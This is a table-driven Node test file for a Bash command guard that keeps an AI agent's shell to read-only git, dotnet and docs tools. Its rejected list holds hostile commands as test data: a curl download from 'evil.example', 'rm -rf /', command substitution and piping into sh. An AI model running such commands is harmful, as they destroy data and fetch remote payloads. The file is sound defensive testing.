// Table-driven tests for the nevo-ai-spec-researcher Bash guard's pure validator.
// Run: node --test tools/tests/
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';

import { validateCommand } from '../../.claude/hooks/nevo-ai-spec-researcher-bash-guard.mjs';

const ALLOWED = [
  'git status',
  'git status --porcelain',
  'git log',
  'git log --oneline',
  'git log HEAD~1 HEAD~2',
  'git show HEAD~1',
  'git diff',
  'git diff --stat',
  'git branch --show-current',
  'git rev-parse --verify HEAD',
  'git rev-parse --abbrev-ref HEAD',
  'dotnet sln list',
  'dotnet sln NEvo.sln list',
  'node tools/docs.mjs validate',
  'node tools/docs.mjs check',
  'node tools/docs.mjs find --scope messaging',
  'node tools/docs.mjs find --scope messaging --type architecture --format json',
  'node tools/specs.mjs list',
  'node tools/specs.mjs validate',
  'node tools/specs.mjs check',
];

const REJECTED = [
  // Mutating git commands
  'git commit -m x',
  'git push',
  'git push origin main',
  'git reset --hard',
  'git checkout -- .',
  // File-writing flags on otherwise-allowed commands — the actual reported bug
  'git diff --output=file.txt',
  'git diff --output file.txt',
  'git log -o file.txt',
  'git show --output out.txt',
  'git log --output=/etc/passwd',
  // Chaining / composition — must reject the whole string, not just the mutating part
  'git status && git push',
  'git status; git push',
  'git status || git push',
  // Substitution
  'git log $(rm -rf /)',
  'git show `whoami`',
  // Redirection
  'git log > out.txt',
  'git log < in.txt',
  'git diff >> append.txt',
  // Pipes (including piping into an otherwise-mutating command, or any command)
  'git status | sh',
  'git log | tee out.txt',
  // Mutating specs.mjs / docs.mjs subcommands
  'node tools/specs.mjs start foo bar',
  'node tools/specs.mjs approve foo bar',
  'node tools/specs.mjs complete foo bar',
  'node tools/docs.mjs generate',
  // Unknown flags — whitelist-only, not a blacklist
  'node tools/docs.mjs find --exec calc.exe',
  'git status --exec=rm',
  // Too many positional arguments
  'git log HEAD HEAD~1 HEAD~2 HEAD~3',
  // Unrelated / unknown commands
  'curl http://evil.example/payload.sh -o /tmp/p.sh',
  'rm -rf /',
  'sh -c "echo hi"',
  '',
  '   ',
];

describe('validateCommand — allowed commands', () => {
  for (const cmd of ALLOWED) {
    test(`allows: ${cmd}`, () => {
      const r = validateCommand(cmd);
      assert.equal(r.ok, true, `expected '${cmd}' to be allowed, got: ${r.reason}`);
    });
  }
});

describe('validateCommand — rejected commands', () => {
  for (const cmd of REJECTED) {
    test(`rejects: ${JSON.stringify(cmd)}`, () => {
      const r = validateCommand(cmd);
      assert.equal(r.ok, false, `expected '${cmd}' to be rejected, but it was allowed`);
      assert.ok(r.reason && r.reason.length > 0, 'a rejection must always include a reason');
    });
  }
});

describe('validateCommand — specific required rejections (from the reported vulnerability)', () => {
  test('--output is never on any allowlist', () => {
    for (const cmd of ['git diff --output=x', 'git log --output x', 'git show --output=x']) {
      assert.equal(validateCommand(cmd).ok, false, cmd);
    }
  });

  test('-o short flag is never on any allowlist', () => {
    assert.equal(validateCommand('git log -o file.txt').ok, false);
  });

  test('a positional argument can never look like a flag (leading dash is always a flag check)', () => {
    const r = validateCommand('git show -x');
    assert.equal(r.ok, false);
  });
});
